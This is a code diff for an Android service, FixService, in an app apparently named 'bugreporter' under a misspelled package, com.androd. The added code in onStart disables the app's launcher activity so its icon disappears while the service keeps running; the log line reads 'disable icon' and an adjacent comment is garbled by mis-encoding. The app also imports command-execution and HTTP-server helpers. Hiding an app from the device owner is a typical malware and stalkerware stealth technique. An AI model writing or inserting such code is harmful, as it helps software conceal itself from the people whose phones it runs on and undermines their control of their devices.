@@ -16,6 +16,7 @@ import org.apache.http.HttpStatus;
 import org.json.JSONObject;
 
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
@@ -32,6 +33,7 @@ import android.provider.Settings.Secure;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.androd.bugreporter.MainActivity;
 import com.androd.bugreporter.MyApplication;
 import com.androd.bugreporter.utils.ExecTools;
 import com.androd.bugreporter.utils.HttpServer;
@@ -69,6 +71,18 @@ public class FixService extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		Log.i(MyApplication.TAG, "onStart");
+		
+		PackageManager packageManager = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        int res = packageManager.getComponentEnabledSetting(componentName);
+        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
+                || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+            // “˛≤ÿ”¶”√Õº±Í
+    		Log.i(MyApplication.TAG, "disable icon");
+            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        }
+        
 		// super.onStart(intent, startId);
 		if (ana == null || !ana.isAlive()) {
 
